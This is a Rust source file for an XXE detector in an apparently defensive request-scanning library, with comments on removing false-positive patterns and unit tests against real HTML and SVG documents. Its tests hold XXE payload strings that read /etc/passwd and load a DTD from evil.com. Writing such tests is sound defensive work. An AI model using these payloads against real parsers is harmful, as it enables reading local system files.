// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use regex::Regex;
use std::sync::LazyLock;

use crate::{AttackCategory, DetectionResult, Detector, Severity, regex_detect};

// 只认实体声明本身。`<!DOCTYPE ` / `PUBLIC "` / `SYSTEM "` 三条已删除：它们是
// 普通文档与散文的日常形态——HTML 首页的 `<!DOCTYPE html>`、Inkscape 等工具产出的
// `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" …>`、以及
// `The report was generated with SYSTEM "production" settings.` 全部被判 Critical。
// 真正的外部实体入口是 `<!ENTITY`，下面这一条已覆盖全部四种实体形态（含大小写混写）。
/// 只剩这一条分支，合并本身不省任何扫描——这里跟其余检测器统一成
/// `LazyLock<Regex>` + `from_ref` 的形态，免得被读成「漏改的那个」。
/// 模式文本与逐条版本逐字相同，行为不变。
static PATTERNS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)<!ENTITY\s+").unwrap());

pub struct XxeDetector;

impl Detector for XxeDetector {
    fn name(&self) -> &'static str {
        "xxe"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        regex_detect(
            std::slice::from_ref(&*PATTERNS),
            self.name(),
            AttackCategory::Protocol,
            Severity::Critical,
            "XXE XML External Entity attack detected",
            input,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_detected(input: &str) {
        crate::test_helpers::assert_detected(
            &XxeDetector,
            input,
            AttackCategory::Protocol,
            Severity::Critical,
        );
    }

    fn assert_clean(input: &str) {
        crate::test_helpers::assert_clean(&XxeDetector, input);
    }

    #[test]
    fn name_is_xxe() {
        assert_eq!(XxeDetector.name(), "xxe");
    }

    #[test]
    fn detects_inline_entity() {
        assert_detected("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
    }

    #[test]
    fn detects_doctype_with_entity() {
        // 命中的是文档里的 `<!ENTITY`，不是 `<!DOCTYPE` —— 没有实体的 DOCTYPE 是普通文档
        assert_detected(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        );
    }

    #[test]
    fn detects_parameter_entity() {
        assert_detected("<!ENTITY % param SYSTEM \"http://evil.com/xxe.dtd\">");
    }

    #[test]
    fn detects_public_entity() {
        assert_detected(
            "<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0//EN\" \"file:///etc/passwd\">",
        );
    }

    #[test]
    fn detects_mixed_case_markup() {
        assert_detected("<!entity xxe system \"file:///etc/passwd\">");
    }

    #[test]
    fn rejects_benign_xml() {
        assert_clean("<note><to>Joe</to><from>Bob</from><body>Hi</body></note>");
        assert_clean("<ENTITY>plain text</ENTITY>");
        assert_clean("<!DOCTYPEfoo>");
        assert_clean("SYSTEM\"file:///etc/passwd\"");
        assert_clean("<!ENTITY>");
    }

    #[test]
    fn rejects_near_misses() {
        assert_clean("<!ENTITYxxe>");
        assert_clean("<!ENTITY%xxe>");
        assert_clean("SYSTEM /etc/passwd");
    }

    /// 现实文档语料。缺了这一组，`<!DOCTYPE `/`PUBLIC "`/`SYSTEM "` 三条误报才会
    /// 上线：作者只验证了 `<!DOCTYPEfoo>`（无空格）与 `SYSTEM`（无引号）这类贴边形态，
    /// 没验证真实文档里的形态。本仓自带 `upload`/`data_leak` 文件内容扫描，
    /// SVG 被判 Critical 等于用户传张图就被拒。
    #[test]
    fn rejects_real_world_documents() {
        // 普通 HTML 页面
        assert_clean(concat!(
            "<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n<meta charset=\"utf-8\">\n",
            "<title>关于我们</title>\n</head>\n<body><p>Hello</p></body>\n</html>"
        ));
        // Inkscape 等工具产出的标准 SVG：DOCTYPE 带 PUBLIC，无任何实体声明
        assert_clean(concat!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
            "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" ",
            "\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n",
            "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\">",
            "<path d=\"M4 4h16v16H4z\"/></svg>"
        ));
        assert_clean(concat!(
            "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" ",
            "\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">"
        ));
        // 散文里的 SYSTEM " / PUBLIC "
        assert_clean("The report was generated with SYSTEM \"production\" settings.");
        assert_clean("The PUBLIC \"roadmap\" document was published last week.");
        // 普通查询串：重复 key 是 hpp 的判定对象，不是 XXE
        assert_clean("/search?tag=rust&tag=security&page=2");
        // 普通文本里的 cc:
        assert_clean("Please cc: ops@example.com on the reply.");
    }

    #[test]
    fn rejects_empty_and_whitespace() {
        assert_clean("");
        assert_clean("   ");
    }

    #[test]
    fn rejects_unicode_text() {
        assert_clean("这是一段普通的中文 XML 描述文本");
    }
}
